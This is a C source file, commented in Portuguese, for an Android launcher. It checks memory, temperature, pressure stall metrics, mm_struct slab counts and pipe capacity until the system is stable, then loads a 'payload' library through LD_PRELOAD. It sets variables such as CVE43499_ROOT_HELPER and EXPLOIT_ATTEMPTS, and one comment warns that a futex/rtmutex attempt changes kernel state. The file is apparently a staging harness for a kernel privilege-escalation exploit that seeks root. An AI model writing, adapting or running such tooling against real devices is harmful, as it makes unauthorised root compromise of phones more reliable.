#define _GNU_SOURCE

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <time.h>
#include <unistd.h>

/* Relaxed profile (default). */
#define REL_MIN_MEM_KB (1L * 1024L * 1024L)
#define REL_MAX_TEMP_MC 48000L
#define REL_MAX_RUNNABLE 8
#define REL_MAX_CPU_PSI 25.0
#define REL_MAX_MEM_PSI 3.0
#define REL_MAX_IO_PSI 5.0
#define REL_MIN_UPTIME_SEC 60.0
#define REL_STABLE_SAMPLES 3
#define REL_MAX_MM_OBJECTS 2048L
#ifndef REL_MAX_MM_SLABS
#define REL_MAX_MM_SLABS 48L
#endif

#ifndef REL_GATE_NAME
#define REL_GATE_NAME "relaxado"
#endif

/* Conservative profile (--conservative). */
#define CONS_MIN_MEM_KB (2L * 1024L * 1024L)
#define CONS_MAX_TEMP_MC 42000L
#define CONS_MAX_RUNNABLE 4
#define CONS_MAX_CPU_PSI 12.0
#define CONS_MAX_MEM_PSI 1.0
#define CONS_MAX_IO_PSI 2.0
#define CONS_MIN_UPTIME_SEC 120.0
#define CONS_STABLE_SAMPLES 5
#define CONS_MAX_MM_OBJECTS 1024L
#define CONS_MAX_MM_SLABS 32L

#define SAMPLE_INTERVAL_SEC 3
#define MAX_WAIT_SEC 300
#define PIPE_COUNT 480
#define PIPE_INITIAL_SIZE (2 * 4096)
#define PIPE_TARGET_SIZE (32 * 4096)

extern char **environ;

struct metrics {
  long mem_kb;
  long temp_mc;
  int runnable;
  double load1;
  double cpu_psi;
  double mem_psi;
  double io_psi;
  double uptime;
  int boot_complete;
  long mm_active;
  long mm_total;
  long mm_slabs;
};

struct gate_cfg {
  long min_mem_kb;
  long max_temp_mc;
  int max_runnable;
  double max_cpu_psi;
  double max_mem_psi;
  double max_io_psi;
  double min_uptime_sec;
  int stable_samples;
  long max_mm_objects;
  long max_mm_slabs;
  const char *name;
};

static struct gate_cfg gate = {
    .min_mem_kb = REL_MIN_MEM_KB,
    .max_temp_mc = REL_MAX_TEMP_MC,
    .max_runnable = REL_MAX_RUNNABLE,
    .max_cpu_psi = REL_MAX_CPU_PSI,
    .max_mem_psi = REL_MAX_MEM_PSI,
    .max_io_psi = REL_MAX_IO_PSI,
    .min_uptime_sec = REL_MIN_UPTIME_SEC,
    .stable_samples = REL_STABLE_SAMPLES,
    .max_mm_objects = REL_MAX_MM_OBJECTS,
    .max_mm_slabs = REL_MAX_MM_SLABS,
    .name = REL_GATE_NAME,
};

static const struct gate_cfg gate_conservative = {
    .min_mem_kb = CONS_MIN_MEM_KB,
    .max_temp_mc = CONS_MAX_TEMP_MC,
    .max_runnable = CONS_MAX_RUNNABLE,
    .max_cpu_psi = CONS_MAX_CPU_PSI,
    .max_mem_psi = CONS_MAX_MEM_PSI,
    .max_io_psi = CONS_MAX_IO_PSI,
    .min_uptime_sec = CONS_MIN_UPTIME_SEC,
    .stable_samples = CONS_STABLE_SAMPLES,
    .max_mm_objects = CONS_MAX_MM_OBJECTS,
    .max_mm_slabs = CONS_MAX_MM_SLABS,
    .name = "conservador",
};

static volatile sig_atomic_t stopped;

static void handle_signal(int signo) {
  (void)signo;
  stopped = 1;
}

static int read_long_file(const char *path, long *value) {
  FILE *file = fopen(path, "re");
  if (!file) return 0;
  int ok = fscanf(file, "%ld", value) == 1;
  fclose(file);
  return ok;
}

static int read_mem_available(long *value) {
  FILE *file = fopen("/proc/meminfo", "re");
  if (!file) return 0;
  char key[64];
  long amount;
  char unit[16];
  int ok = 0;
  while (fscanf(file, "%63s %ld %15s", key, &amount, unit) == 3) {
    if (strcmp(key, "MemAvailable:") == 0) {
      *value = amount;
      ok = 1;
      break;
    }
  }
  fclose(file);
  return ok;
}

static int read_load(double *load1, int *runnable) {
  FILE *file = fopen("/proc/loadavg", "re");
  if (!file) return 0;
  double load5, load15;
  int total;
  int ok = fscanf(file, "%lf %lf %lf %d/%d", load1, &load5, &load15,
                  runnable, &total) == 5;
  fclose(file);
  return ok;
}

static int read_psi(const char *path, double *avg10) {
  FILE *file = fopen(path, "re");
  if (!file) return 0;
  char line[256];
  int ok = 0;
  if (fgets(line, sizeof(line), file) && strncmp(line, "some ", 5) == 0) {
    char *field = strstr(line, "avg10=");
    if (field) {
      char *end = NULL;
      errno = 0;
      double value = strtod(field + 6, &end);
      if (errno == 0 && end != field + 6) {
        *avg10 = value;
        ok = 1;
      }
    }
  }
  fclose(file);
  return ok;
}

static int read_max_temperature(long *maximum) {
  DIR *dir = opendir("/sys/class/thermal");
  if (!dir) return 0;
  long max_seen = 0;
  int found = 0;
  struct dirent *entry;
  while ((entry = readdir(dir)) != NULL) {
    if (strncmp(entry->d_name, "thermal_zone", 12) != 0) continue;
    char path[256];
    int length = snprintf(path, sizeof(path), "/sys/class/thermal/%s/temp",
                          entry->d_name);
    if (length <= 0 || (size_t)length >= sizeof(path)) continue;
    long value;
    if (read_long_file(path, &value) && value > 0 && value < 200000) {
      if (!found || value > max_seen) max_seen = value;
      found = 1;
    }
  }
  closedir(dir);
  if (found) *maximum = max_seen;
  return found;
}

static int read_uptime(double *uptime) {
  FILE *file = fopen("/proc/uptime", "re");
  if (!file) return 0;
  int ok = fscanf(file, "%lf", uptime) == 1;
  fclose(file);
  return ok;
}

static int read_boot_complete(void) {
  char value[PROP_VALUE_MAX] = {0};
  return __system_property_get("sys.boot_completed", value) > 0 &&
         strcmp(value, "1") == 0;
}

static int read_mm_struct_slab(long *active, long *total, long *slabs) {
  FILE *file = fopen("/proc/slabinfo", "re");
  if (!file) return 0;
  char line[512];
  int ok = 0;
  while (fgets(line, sizeof(line), file)) {
    char name[64];
    long active_objs, total_objs, object_size, objects_per_slab;
    long pages_per_slab;
    if (sscanf(line, "%63s %ld %ld %ld %ld %ld", name, &active_objs,
               &total_objs, &object_size, &objects_per_slab,
               &pages_per_slab) != 6 || strcmp(name, "mm_struct") != 0) {
      continue;
    }
    if (objects_per_slab <= 0) break;
    *active = active_objs;
    *total = total_objs;
    *slabs = (total_objs + objects_per_slab - 1) / objects_per_slab;
    ok = 1;
    break;
  }
  fclose(file);
  return ok;
}

static int collect_metrics(struct metrics *m) {
  memset(m, 0, sizeof(*m));
  m->boot_complete = read_boot_complete();
  return read_mem_available(&m->mem_kb) &&
         read_max_temperature(&m->temp_mc) &&
         read_load(&m->load1, &m->runnable) &&
         read_psi("/proc/pressure/cpu", &m->cpu_psi) &&
         read_psi("/proc/pressure/memory", &m->mem_psi) &&
         read_psi("/proc/pressure/io", &m->io_psi) &&
         read_uptime(&m->uptime) &&
         read_mm_struct_slab(&m->mm_active, &m->mm_total, &m->mm_slabs);
}

static int metrics_stable(const struct metrics *m) {
  return m->boot_complete && m->uptime >= gate.min_uptime_sec &&
         m->mem_kb >= gate.min_mem_kb && m->temp_mc <= gate.max_temp_mc &&
         m->runnable <= gate.max_runnable && m->cpu_psi <= gate.max_cpu_psi &&
         m->mem_psi <= gate.max_mem_psi && m->io_psi <= gate.max_io_psi &&
         m->mm_active <= gate.max_mm_objects && m->mm_total <= gate.max_mm_objects &&
         m->mm_slabs <= gate.max_mm_slabs;
}

static void wait_interval(void) {
  struct timespec delay = {.tv_sec = SAMPLE_INTERVAL_SEC, .tv_nsec = 0};
  while (!stopped && nanosleep(&delay, &delay) != 0 && errno == EINTR) {}
}

static int pipe_capacity_probe(void) {
  int pipes[PIPE_COUNT][2];
  for (int i = 0; i < PIPE_COUNT; i++) {
    pipes[i][0] = -1;
    pipes[i][1] = -1;
  }
  struct rlimit limit;
  if (getrlimit(RLIMIT_NOFILE, &limit) == 0) {
    limit.rlim_cur = limit.rlim_max;
    (void)setrlimit(RLIMIT_NOFILE, &limit);
  }
  int ok = 1;
  int failed_at = -1;
  int saved_errno = 0;
  for (int i = 0; i < PIPE_COUNT; i++) {
    if (pipe2(pipes[i], O_CLOEXEC) != 0 ||
        fcntl(pipes[i][0], F_SETPIPE_SZ, PIPE_INITIAL_SIZE) == -1) {
      ok = 0;
      failed_at = i;
      saved_errno = errno;
      break;
    }
  }
  if (ok) {
    for (int i = 0; i < PIPE_COUNT; i++) {
      if (fcntl(pipes[i][0], F_SETPIPE_SZ, PIPE_TARGET_SIZE) == -1) {
        ok = 0;
        failed_at = i;
        saved_errno = errno;
        break;
      }
    }
  }
  for (int i = 0; i < PIPE_COUNT; i++) {
    if (pipes[i][0] >= 0) close(pipes[i][0]);
    if (pipes[i][1] >= 0) close(pipes[i][1]);
  }
  if (ok) {
    fprintf(stderr,
            "[launcher] pipe-gate=pass pipes=%d target_pages=%d\n",
            PIPE_COUNT, PIPE_TARGET_SIZE / 4096);
  } else {
    fprintf(stderr,
            "[launcher] pipe-gate=fail index=%d errno=%d(%s); aguardando quota\n",
            failed_at, saved_errno, strerror(saved_errno));
  }
  return ok;
}

static long elapsed_seconds(const struct timespec *start) {
  struct timespec now;
  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) return MAX_WAIT_SEC;
  return now.tv_sec - start->tv_sec;
}

static int validate_elf(const char *path) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return 0;
  unsigned char magic[4];
  ssize_t count = read(fd, magic, sizeof(magic));
  close(fd);
  return count == 4 && magic[0] == 0x7f && magic[1] == 'E' &&
         magic[2] == 'L' && magic[3] == 'F';
}

static void usage(const char *program) {
  fprintf(stderr,
          "Uso: %s --payload CAMINHO --helper CAMINHO [--check-only] "
          "[--conservative]\n",
          program);
}

int main(int argc, char **argv) {
  const char *inherited_preload = getenv("LD_PRELOAD");
  if (inherited_preload && inherited_preload[0] != '\0') {
    fprintf(stderr,
            "[launcher] recusado: LD_PRELOAD já estava definido antes do gate\n");
    return 2;
  }
  const char *payload = NULL;
  const char *helper = NULL;
  int check_only = 0;
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--payload") == 0 && i + 1 < argc) {
      payload = argv[++i];
    } else if (strcmp(argv[i], "--helper") == 0 && i + 1 < argc) {
      helper = argv[++i];
    } else if (strcmp(argv[i], "--check-only") == 0) {
      check_only = 1;
    } else if (strcmp(argv[i], "--conservative") == 0) {
      gate = gate_conservative;
    } else {
      usage(argv[0]);
      return 2;
    }
  }
  if (!check_only && (!payload || !helper)) {
    usage(argv[0]);
    return 2;
  }
  if (!check_only && (!validate_elf(payload) || !validate_elf(helper))) {
    fprintf(stderr, "[launcher] payload/helper ausente ou ELF inválido\n");
    return 2;
  }

  struct sigaction action;
  memset(&action, 0, sizeof(action));
  action.sa_handler = handle_signal;
  sigemptyset(&action.sa_mask);
  sigaction(SIGINT, &action, NULL);
  sigaction(SIGTERM, &action, NULL);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  fprintf(stderr,
          "[launcher] gate %s: %d amostras/%ds temp<=%ldC mem>=%ldGB "
          "tarefas<=%d PSI<=%.0f/%.0f/%.0f uptime>=%.0fs mm<=%ld/%ld "
          "pipe=480x32 timeout=%ds\n",
          gate.name, gate.stable_samples, SAMPLE_INTERVAL_SEC,
          gate.max_temp_mc / 1000, gate.min_mem_kb / (1024 * 1024),
          gate.max_runnable, gate.max_cpu_psi, gate.max_mem_psi,
          gate.max_io_psi, gate.min_uptime_sec, gate.max_mm_objects,
          gate.max_mm_slabs, MAX_WAIT_SEC);
  struct timespec started;
  if (clock_gettime(CLOCK_MONOTONIC, &started) != 0) {
    perror("[launcher] clock_gettime");
    return 1;
  }
  int stable = 0;
  while (!stopped && elapsed_seconds(&started) < MAX_WAIT_SEC) {
    struct metrics m;
    int valid = collect_metrics(&m);
    int accepted = valid && metrics_stable(&m);
    stable = accepted ? stable + 1 : 0;
    if (valid) {
      fprintf(stderr,
              "[launcher] gate=%d/%d phase=%s temp=%.1fC mem=%ldMB runnable=%d "
              "load=%.2f psi=%.2f/%.2f/%.2f mm=%ld/%ld slabs=%ld "
              "uptime=%.0fs boot=%d\n",
              stable, gate.stable_samples, "baseline", m.temp_mc / 1000.0,
              m.mem_kb / 1024,
              m.runnable, m.load1, m.cpu_psi, m.mem_psi, m.io_psi,
              m.mm_active, m.mm_total, m.mm_slabs, m.uptime,
              m.boot_complete);
    } else {
      fprintf(stderr, "[launcher] gate=0/%d leitura de métricas inválida\n",
              gate.stable_samples);
    }
    if (stable >= gate.stable_samples) {
      if (pipe_capacity_probe()) {
        break;
      }
      stable = 0;
    }
    wait_interval();
  }
  if (stopped) {
    fprintf(stderr, "[launcher] cancelado antes de carregar payload\n");
    return 130;
  }
  if (stable < gate.stable_samples) {
    fprintf(stderr, "[launcher] ambiente não estabilizou; payload não carregado\n");
    return 1;
  }
  fprintf(stderr,
          "[launcher] estabilidade confirmada: métricas+slab+pipe\n");
  if (check_only) return 0;

  /* A futex/rtmutex attempt can mutate kernel PI state even when userspace
   * reports failure. Never retry in the same boot. Override inherited values
   * so callers cannot accidentally expand a validation run to 24 attempts. */
  if (setenv("CVE43499_ROOT_HELPER", helper, 1) != 0 ||
      setenv("EXPLOIT_ATTEMPTS", "1", 1) != 0 ||
      setenv("P0_ATTEMPT_TIMEOUT_SEC", "45", 0) != 0 ||
      setenv("EXPLOIT_ATTEMPT_TIMEOUT_SEC", "180", 0) != 0 ||
      setenv("BOOT_QUIET_SEC", "0", 0) != 0 ||
      setenv("FUTEX_WAIT_SEC", "1", 0) != 0 ||
      setenv("KSNITCH_REPEAT", "64", 0) != 0 ||
      setenv("LD_PRELOAD", payload, 1) != 0) {
    perror("[launcher] setenv");
    return 1;
  }
  fprintf(stderr, "[launcher] execve: carregando payload agora\n");
  char *const child_argv[] = {"/system/bin/true", NULL};
  execve(child_argv[0], child_argv, environ);
  perror("[launcher] execve");
  return 1;
}
